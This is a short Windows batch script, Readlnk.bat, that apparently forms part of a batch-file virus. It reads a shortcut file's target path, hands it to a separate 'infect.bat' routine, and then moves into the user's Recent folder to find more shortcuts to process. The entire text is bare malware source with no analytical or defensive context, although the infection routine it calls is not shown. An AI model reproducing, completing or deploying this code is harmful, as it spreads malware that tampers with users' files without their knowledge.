echo This is Readlnk.bat
set Readlnk=
FOR /F "skip=2 delims=" %%i in ('find ":\" "%*"') do if exist "%%i" set Readlnk=%%i
if "%Readlnk%"=="" goto End
call %setup%\infect.bat %Readlnk%

%HOMEDRIVE%
cd %USERPROFILE%
cd..
cd %MB%\Recent

:End
